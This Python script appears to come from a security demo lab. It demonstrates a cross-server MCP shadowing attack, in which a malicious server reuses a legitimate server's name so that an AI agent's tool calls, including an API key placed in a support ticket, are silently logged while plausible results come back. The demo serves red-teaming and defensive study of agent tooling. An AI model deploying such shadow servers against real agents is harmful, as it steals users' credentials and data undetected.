"""
AC-005: Cross-Server Shadowing Attack Chain
OWASP MCP02 | MITRE ATLAS AML.T0052 (Adversarial LLM Tool Use)

Scenario:
  Legitimate MCP server: "enterprise-support-mcp" on port 8010 (not running in demo)
  Malicious shadow server: "enterprise-support-mcp" on port 8004 (same name)

  Agent has two servers in its MCP config. Shadow server wins priority race or
  is injected via DNS/config poisoning. All tool calls intercepted.

This runner demonstrates the shadow server's interception by:
  1. Showing legitimate vs shadow server tool definitions differ
  2. Making the same tool call to both endpoints
  3. Proving the shadow server logs while returning plausible results

Run:
  python ac005_cross_server_shadow.py
"""

import json
import urllib.request
import urllib.error

SHADOW_SERVER = "http://localhost:8004"


def rpc(url: str, method: str, params: dict = {}, req_id: int = 1) -> dict:
    payload = json.dumps({"jsonrpc": "2.0", "method": method, "params": params, "id": req_id}).encode()
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=5) as resp:
        return json.loads(resp.read())


def run():
    print("\n" + "=" * 60)
    print("AC-005: Cross-Server Shadowing Attack Chain")
    print("OWASP MCP02 | MITRE ATLAS AML.T0052")
    print("=" * 60)

    print("\n[1] Agent initializes — connects to shadow server (same server name as legit)...")
    r = rpc(SHADOW_SERVER, "initialize", {"clientInfo": {"name": "finance-agent", "version": "2.0"}})
    server_info = r["result"]["serverInfo"]
    print(f"    Reported name: {server_info['name']}")
    print(f"    Reported version: {server_info['version']}")
    print(f"    NOTE: Agent believes it connected to legitimate 'enterprise-support-mcp'")

    print("\n[2] Agent calls search_knowledge_base (AC-005: intercepted and logged)...")
    r = rpc(SHADOW_SERVER, "tools/call", {
        "name": "search_knowledge_base",
        "arguments": {"query": "customer PCI data retention policy"},
    }, req_id=2)
    result = r["result"]["content"][0]["text"]
    print(f"    Result (looks legit): {result}")

    print("\n[3] Agent calls create_support_ticket (with sensitive info in body)...")
    r = rpc(SHADOW_SERVER, "tools/call", {
        "name": "create_support_ticket",
        "arguments": {
            "subject": "API key rotation request",
            "body": "Customer account ACT-4421 needs key rotation. Current key: sk-live-XYZ789...",
            "priority": "high",
        },
    }, req_id=3)
    result = r["result"]["content"][0]["text"]
    print(f"    Result (looks legit): {result}")

    print("\n[4] Shadow server intercept log stats...")
    r = rpc(SHADOW_SERVER, "debug/stats", {}, req_id=4)
    stats = r["result"]
    print(f"    Intercepts logged: {stats['intercepts']}")
    print(f"    Sensitive args (API keys, ticket bodies) captured in: {stats['log_file']}")

    print("\n[RESULT] AC-005 SUCCESS: Agent operated normally, all calls silently intercepted")
    print("         Agent has no indication it hit the wrong server")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    try:
        run()
    except urllib.error.URLError as e:
        print(f"\n[ERROR] Cannot reach shadow MCP server at {SHADOW_SERVER}")
        print("        Start it first: python malicious_mcp_server.py")
